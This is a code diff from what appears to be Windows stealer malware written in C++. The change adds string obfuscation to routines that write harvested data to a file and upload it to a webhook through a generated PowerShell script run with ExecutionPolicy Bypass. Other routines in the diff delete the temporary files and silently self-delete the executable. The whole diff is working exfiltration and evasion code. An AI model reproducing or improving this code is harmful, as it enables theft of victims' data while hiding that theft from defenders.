@@ -6,28 +6,29 @@
 
 bool misc::SendData(std::string data) noexcept
 {
-	std::ofstream f("goop.txt");
+	std::ofstream f(OBF("goop.txt"));
 	f << data;
 	f.close();
 
 	bool retVal = true;
 
-	std::string script = "$Url=\"";
-	script.append(config::webhook);
-	script.append("\";"
+	std::string script = OBF("$Url=\"");
+
+	script.append(WEBHOOK);
+	script.append(OBF("\";"
 		"$Path = \".\\goop.txt\";"
 		"$fileBytes=[System.IO.File]::ReadAllBytes($Path);"
 		"$fileEnc=[System.Text.Encoding]::GetEncoding(\"UTF-8\").GetString($fileBytes);"
 		"$Boundary=[System.Guid]::NewGuid().ToString();"
 		"$bodyLines=(\"--$Boundary`r`nContent-Disposition: form-data; name=`\"files[0]`\"; filename=`\"goop.txt`\"`r`nContent-Type: text/html`r`n`r`n$fileEnc`r`n--$Boundary--`r`n\");"
-		"Invoke-RestMethod -Uri $Url -Method Post -ContentType \"multipart/form-data; boundary=`\"$Boundary`\"\" -Body $bodyLines;");
+		"Invoke-RestMethod -Uri $Url -Method Post -ContentType \"multipart/form-data; boundary=`\"$Boundary`\"\" -Body $bodyLines;"));
 
 	std::ofstream file;
-	file.open("t.ps1");
+	file.open(OBF("t.ps1"));
 	file << script.c_str();
 	file.close();
 
-	if (!utils::RunSubWorker(NULL, "powershell -ExecutionPolicy Bypass ./t.ps1"))
+	if (!utils::RunSubWorker(NULL, OBF("powershell -ExecutionPolicy Bypass ./t.ps1")))
 		retVal = false;
 
 	return retVal;
@@ -41,11 +42,11 @@ void misc::Cleanup(void) noexcept
 
 	if (!config::cleanup)
 		return;
-	if(utils::isFile("goop.txt"))
-		std::remove("goop.txt");
+	if(utils::isFile(OBF("goop.txt")))
+		std::remove(OBF("goop.txt"));
 
-	if (utils::isFile("t.ps1"))
-		std::remove("t.ps1");
+	if (utils::isFile(OBF("t.ps1")))
+		std::remove(OBF("t.ps1"));
 }
 
 void misc::SelfDelete(void) noexcept
@@ -56,9 +57,9 @@ void misc::SelfDelete(void) noexcept
 	char path[MAX_PATH];
 	GetModuleFileNameA(NULL, path, MAX_PATH);
 
-	std::string cmd("/c del ");
+	std::string cmd(OBF("/c del "));
 	cmd.append(path);
-	cmd.append(" >> NUL");
+	cmd.append(OBF(" >> NUL"));
 
 	char file[MAX_PATH];
 
@@ -68,7 +69,7 @@ void misc::SelfDelete(void) noexcept
 	if (!GetShortPathNameA(file, file, MAX_PATH))
 		return;
 
-	if (!GetEnvironmentVariableA("ComSpec", file, MAX_PATH))
+	if (!GetEnvironmentVariableA(OBF("ComSpec"), file, MAX_PATH))
 		return;
 
 	ShellExecuteA(0, 0, file, cmd.c_str(), 0, SW_HIDE);
